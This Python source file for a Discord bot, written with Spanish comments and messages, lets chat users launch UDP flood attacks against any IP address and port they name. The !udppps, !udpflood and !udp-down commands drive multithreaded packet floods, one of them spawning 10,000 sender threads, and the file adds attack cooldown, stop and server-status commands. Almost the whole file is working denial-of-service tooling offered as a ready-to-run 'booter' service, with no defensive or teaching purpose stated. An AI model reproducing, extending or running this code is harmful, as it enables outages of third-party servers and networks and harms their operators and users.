import discord
from discord.ext import commands
import socket
import time
import asyncio
import threading
from random import randint
import getpass
import os

# Pedir el token al iniciar el script (no hardcodeado)
TOKEN = getpass.getpass("Introduce el token de tu bot de Discord: ")

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Control de ataques en curso y cooldown
attack_in_progress = False
last_attack_time = 0
cooldown_seconds = 10
current_attack_stop_event = None

@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user.name}')

@bot.command(name='ayuda')
async def ayuda(ctx):
    help_text = (
        "**Comandos disponibles:**\n"
        "- `!ayuda`\n"
        "- `!methods`\n"
        "- `!stop`\n"
        "- `!botstatus`"
    )
    await ctx.send(content=help_text)

@bot.command(name='methods')
async def methods(ctx):
    methods_text = (
        "**Métodos disponibles:**\n"
        "- `!udppps <ip> <port> <time>`\n"
        "- `!udpflood <ip> <port> <time>`\n"
        "- `!udp-down <ip> <port> <time>`\n"
        "- `!stop`"
    )
    await ctx.send(methods_text)

# ------------------ BOT STATUS ------------------
@bot.command(name='botstatus')
async def botstatus(ctx):
    # Medimos el uso de CPU y RAM para estimar el estado
    try:
        # Carga de CPU en 1 minuto
        cpu_load = os.getloadavg()[0] if hasattr(os, "getloadavg") else 0
        # RAM libre y total (en MB)
        if os.path.exists('/proc/meminfo'):
            with open('/proc/meminfo') as f:
                lines = f.readlines()
            mem_total = int([x for x in lines if "MemTotal" in x][0].split()[1]) / 1024
            mem_free = int([x for x in lines if "MemAvailable" in x][0].split()[1]) / 1024
        else:
            mem_total = mem_free = 0

        # Puedes ajustar estos umbrales según tu VPS
        cpu_cores = os.cpu_count() or 1
        cpu_percent = min(cpu_load / cpu_cores, 1.0)
        mem_percent = 1 - (mem_free / mem_total) if mem_total else 0

        # Determina estado
        status = "🟢 God"
        if cpu_percent > 0.7 or mem_percent > 0.7:
            status = "🟡 Medio"
        if cpu_percent > 0.9 or mem_percent > 0.9:
            status = "🔴 Mal"

        await ctx.send(f"**Estado del bot:** {status}\n"
                       f"CPU: {cpu_load:.2f} ({cpu_percent*100:.0f}%)\n"
                       f"RAM libre: {mem_free:.0f}MB / {mem_total:.0f}MB ({mem_percent*100:.0f}%)")
    except Exception as e:
        await ctx.send(f"No se pudo obtener el estado del bot: {e}")

# ------------------ UDPPPS ------------------
class Brutalize:
    def __init__(self, ip, port, packet_size=1024, threads=5, stop_event=None):
        self.ip = ip
        self.port = port
        self.packet_size = packet_size
        self.threads = threads
        self.client = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
        self.data = str.encode("x" * self.packet_size)
        self.len = len(self.data)
        self.on = False
        self.sent = 0
        self.total = 0
        self.stop_event = stop_event

    def flood(self, duration):
        self.on = True
        self.sent = 0
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.send, daemon=True)
            t.start()
            threads.append(t)
        info_thread = threading.Thread(target=self.info, daemon=True)
        info_thread.start()
        end_time = time.time() + duration
        try:
            while time.time() < end_time and self.on:
                if self.stop_event and self.stop_event.is_set():
                    break
                time.sleep(0.1)
            self.stop()
        except KeyboardInterrupt:
            self.stop()

    def info(self):
        interval = 0.05
        mb = 1000000
        gb = 1000000000
        size = 0
        self.total = 0
        last_time = time.time()
        while self.on:
            time.sleep(interval)
            if not self.on:
                break
            now = time.time()
            if now - last_time >= 1:
                size = round(self.sent / mb)
                self.total += self.sent / gb
                self.sent = 0
                last_time = now

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            if self.stop_event and self.stop_event.is_set():
                break
            try:
                self.client.sendto(self.data, (self.ip, self._randport()))
                self.sent += self.len
            except Exception:
                pass

    def _randport(self):
        return self.port or randint(1, 65535)

@bot.command(name='udppps')
async def udppps(ctx, ip: str, port: int, tiempo: int):
    global attack_in_progress, last_attack_time, current_attack_stop_event
    if attack_in_progress:
        await ctx.send("Ya hay un ataque en curso, espera a que termine antes de iniciar otro")
        return
    if time.time() - last_attack_time < cooldown_seconds:
        await ctx.send(f"Debes esperar {int(cooldown_seconds - (time.time() - last_attack_time))} segundos antes de lanzar otro ataque")
        return
    attack_in_progress = True
    current_attack_stop_event = threading.Event()
    await ctx.send(f"Atacando a {ip}:{port} por {tiempo} segundos (UDPPPS)...")
    try:
        brute = Brutalize(ip, port, 1024, 5, stop_event=current_attack_stop_event)
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, brute.flood, tiempo)
        await ctx.send(f"UDPPPS finalizado")
    except Exception as e:
        await ctx.send(f"Error al ejecutar UDPPPS: {e}")
    finally:
        attack_in_progress = False
        last_attack_time = time.time()
        current_attack_stop_event = None

@udppps.error
async def udppps_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Uso correcto: `!udppps <ip> <port> <time>`")
    else:
        await ctx.send(f"Ocurrió un error: {error}")

# ------------------ UDP-FLOOD ------------------
def send_packet_flood(ip, port, amplifier, stop_event):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(ip), int(port)))
        while not stop_event.is_set():
            s.send(b"\x99" * amplifier)
    except Exception:
        try:
            s.close()
        except:
            pass

def udp_flood_attack(ip, port, duration, amplifier, stop_event):
    loops = 10000
    threads = []
    for _ in range(loops):
        t = threading.Thread(target=send_packet_flood, args=(ip, port, amplifier, stop_event), daemon=True)
        t.start()
        threads.append(t)
    # Espera el tiempo de duración y luego detiene el evento (o antes si se llama !stop)
    end_time = time.time() + duration
    while time.time() < end_time:
        if stop_event.is_set():
            break
        time.sleep(0.1)
    stop_event.set()

@bot.command(name='udpflood')
async def udpflood(ctx, ip: str, port: int, tiempo: int):
    global attack_in_progress, last_attack_time, current_attack_stop_event
    if attack_in_progress:
        await ctx.send("Ya hay un ataque en curso, espera a que termine antes de iniciar otro")
        return
    if time.time() - last_attack_time < cooldown_seconds:
        await ctx.send(f"Debes esperar {int(cooldown_seconds - (time.time() - last_attack_time))} segundos antes de lanzar otro ataque")
        return
    attack_in_progress = True
    current_attack_stop_event = threading.Event()
    await ctx.send(f"Atacando a {ip}:{port} por {tiempo} segundos (UDP-FLOOD)...")
    try:
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, udp_flood_attack, ip, port, tiempo, 750, current_attack_stop_event)
        await ctx.send(f"UDP-FLOOD finalizado")
    except Exception as e:
        await ctx.send(f"Error al ejecutar UDP-FLOOD: {e}")
    finally:
        attack_in_progress = False
        last_attack_time = time.time()
        current_attack_stop_event = None

@udpflood.error
async def udpflood_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Uso correcto: `!udpflood <ip> <port> <time>`")
    else:
        await ctx.send(f"Ocurrió un error: {error}")

# ------------------ UDP-DOWN ------------------
@bot.command(name='udp-down')
async def udp_down(ctx, ip: str, port: int, tiempo: int):
    global attack_in_progress, last_attack_time, current_attack_stop_event
    if attack_in_progress:
        await ctx.send("Ya hay un ataque en curso, espera a que termine antes de iniciar otro")
        return
    if time.time() - last_attack_time < cooldown_seconds:
        await ctx.send(f"Debes esperar {int(cooldown_seconds - (time.time() - last_attack_time))} segundos antes de lanzar otro ataque")
        return
    attack_in_progress = True
    current_attack_stop_event = threading.Event()
    await ctx.send(f"Atacando a {ip}:{port} por {tiempo} segundos (UDP-DOWN)...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = "\x30\x30\x30\x30\x34\x30\x30\x30".encode('utf-8')
        end_time = time.time() + tiempo
        sent_packets = 0
        while time.time() < end_time:
            if current_attack_stop_event.is_set():
                break
            s.sendto(payload, (ip, port))
            sent_packets += 1
            await asyncio.sleep(0)
        await ctx.send(f"UDP-DOWN finalizado, paquetes enviados: {sent_packets}")
    except Exception as e:
        await ctx.send(f"Error al ejecutar UDP-DOWN: {e}")
    finally:
        attack_in_progress = False
        last_attack_time = time.time()
        current_attack_stop_event = None

@udp_down.error
async def udp_down_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Uso correcto: `!udp-down <ip> <port> <time>`")
    else:
        await ctx.send(f"Ocurrió un error: {error}")

# ------------------ STOP ALL ATTACKS ------------------
@bot.command(name='stop')
async def stop(ctx):
    global attack_in_progress, current_attack_stop_event
    if attack_in_progress and current_attack_stop_event:
        current_attack_stop_event.set()
        await ctx.send("✅✅Todos los ataques han sido detenidos.")
    else:
        await ctx.send("❌⚠️No hay ataques en curso para detener.")

bot.run(TOKEN)
